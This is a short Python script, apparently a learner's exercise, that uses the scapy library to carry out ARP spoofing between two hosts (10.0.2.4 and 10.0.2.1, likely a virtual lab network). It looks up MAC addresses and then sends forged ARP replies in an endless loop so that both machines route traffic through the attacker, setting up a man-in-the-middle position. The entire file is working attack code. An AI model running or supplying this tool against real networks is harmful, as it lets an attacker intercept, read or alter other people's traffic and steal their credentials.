#!/usr/bin/env python3
# @Author - Avish Dhirawat
# Date - 11 July 2020

import scapy.all as scapy
import time
import sys

def get_mac(ip): # Copied the scan function from the netword_scanner.py file and named it get_mac
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    #print(answered_list.show())

    return answered_list[0][1].hwsrc
    #print(answered_list[0][1].hwsrc)
    #clients_list = []
    #for element in answered_list:
        #client_dict = {"ip" : element[1].psrc, "MAC" : element[1].hwsrc}
        #clients_list.append(client_dict)
    #return clients_list

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose = False)

sent_packets_count = 0
while True:
    spoof("10.0.2.4", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.4")
    #get_mac("10.0.2.1")
    sent_packets_count+=2
    #print("\r[+] Packets sent: "+ str(sent_packets_count)),    # Additional coma(,) for saving it into buffer
    #sys.stdout.flush()                                         # Both of the lines are used to print it on same line in python2
    print("\r[+] Packets sent: "+ str(sent_packets_count), end ="") # Printing in same line by overriting previous result in python3
    time.sleep(2)
